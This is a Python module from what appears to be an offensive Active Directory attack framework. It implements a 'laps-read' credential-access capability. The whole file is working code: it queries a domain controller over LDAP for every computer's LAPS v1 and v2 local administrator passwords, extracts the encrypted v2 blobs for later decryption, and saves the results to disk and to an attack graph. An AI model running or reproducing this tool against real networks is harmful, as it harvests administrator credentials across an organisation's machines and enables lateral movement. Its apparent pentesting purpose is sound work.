"""LAPS v1 and v2 password reader."""

from __future__ import annotations

import base64
import json
from datetime import UTC, datetime
from typing import Any

from ldap3 import SUBTREE
from rich.console import Console

from adaf_attack.core.graph import AttackGraph
from adaf_attack.core.ldap_util import ldap_connect
from adaf_attack.core.redaction import redact
from adaf_attack.core.registry import register_capability
from adaf_attack.core.session import Session
from adaf_attack.core.target import Target

console = Console()

V1_ATTR = "ms-Mcs-AdmPwd"
V1_EXPIRY = "ms-Mcs-AdmPwdExpirationTime"
V2_ATTR = "msLAPS-EncryptedPassword"
V2_PLAIN = "msLAPS-Password"
V2_EXPIRY = "msLAPS-PasswordExpirationTime"


def _decode_v2_blob(raw: bytes | str) -> dict[str, Any]:
    """Parse the msLAPS-EncryptedPassword blob header (upn hash, timestamp, DPAPI-NG payload)."""
    if isinstance(raw, str):
        raw = raw.encode("latin-1", errors="ignore")
    if len(raw) < 16:
        return {"blob_len": len(raw), "note": "too-short"}
    ts = int.from_bytes(raw[0:8], "little", signed=False)
    payload_len = int.from_bytes(raw[8:12], "little", signed=False)
    return {
        "blob_len": len(raw),
        "timestamp_filetime": ts,
        "payload_length_declared": payload_len,
        "dpapi_ng_payload_b64": base64.b64encode(raw[16:]).decode("ascii"),
    }


@register_capability(
    id="laps-read",
    summary="Read LAPS v1 (ms-Mcs-AdmPwd) and v2 (msLAPS-EncryptedPassword) passwords",
    category="credential-access",
    tags=("laps", "local-admin", "ms-mcs-admpwd", "mslaps"),
)
class LapsRead:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        include_secrets: bool = False,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        computer_filter = kwargs.get("computer_filter") or "(objectClass=computer)"
        console.print(f"[bold]LAPS read[/bold] → {target.domain} @ {target.dc_ip}")
        conn, base_dn, _ = ldap_connect(target)

        conn.search(
            base_dn,
            computer_filter,
            search_scope=SUBTREE,
            attributes=[
                "sAMAccountName",
                "distinguishedName",
                "dNSHostName",
                V1_ATTR,
                V1_EXPIRY,
                V2_ATTR,
                V2_PLAIN,
                V2_EXPIRY,
            ],
        )

        entries: list[dict[str, Any]] = []
        v1_reads = 0
        v2_reads = 0
        for entry in conn.entries:
            sam = str(entry.sAMAccountName) if entry.sAMAccountName else None
            dn = str(entry.distinguishedName)
            record: dict[str, Any] = {
                "sam": sam,
                "dn": dn,
                "dns": str(entry.dNSHostName) if entry.dNSHostName else None,
            }
            v1 = getattr(entry, V1_ATTR, None)
            if v1 and v1.value:
                v1_reads += 1
                record["v1_password"] = str(v1.value)
                record["v1_expiry_filetime"] = (
                    int(entry[V1_EXPIRY].value) if entry[V1_EXPIRY] else None
                )
            v2_plain = getattr(entry, V2_PLAIN, None)
            if v2_plain and v2_plain.value:
                v2_reads += 1
                record["v2_password"] = str(v2_plain.value)
            v2_enc = getattr(entry, V2_ATTR, None)
            if v2_enc and v2_enc.value:
                v2_reads += 1
                record["v2_encrypted"] = _decode_v2_blob(v2_enc.value)
                record["v2_note"] = (
                    "DPAPI-NG decryption requires domain-wide unwrap key; "
                    "surface the blob and decrypt off-host if authorized."
                )
            if sam and any(key in record for key in ("v1_password", "v2_password", "v2_encrypted")):
                console.print(
                    f"  [cyan]{sam}[/cyan]  "
                    f"v1={'yes' if 'v1_password' in record else '-'}  "
                    f"v2={'yes' if 'v2_password' in record or 'v2_encrypted' in record else '-'}"
                )
                node = f"COMPUTER@{sam.upper()}@{target.domain.upper()}"
                graph.add_node(node, "Computer", sam=sam, dn=dn, laps=True)
                graph.add_edge(node, node, "HasLapsPassword")
            entries.append(record)
        conn.unbind()

        result = {
            "domain": target.domain,
            "count": len(entries),
            "v1_readable": v1_reads,
            "v2_readable": v2_reads,
            "generated_at": datetime.now(UTC).isoformat(),
            "entries": entries,
        }
        redacted = redact(result, include_secrets=include_secrets)
        out = session.path("laps.json")
        out.write_text(json.dumps(redacted, indent=2, default=str), encoding="utf-8")
        graph.save(session.path("graph.json"))
        session.log(
            "laps-read.complete",
            count=len(entries),
            v1=v1_reads,
            v2=v2_reads,
            include_secrets=include_secrets,
        )
        console.print(
            f"[green]Done[/green]  computers={len(entries)}  v1={v1_reads}  v2={v2_reads}"
        )
        console.print(f"Results → {out}")
        return dict(redacted) if isinstance(redacted, dict) else result
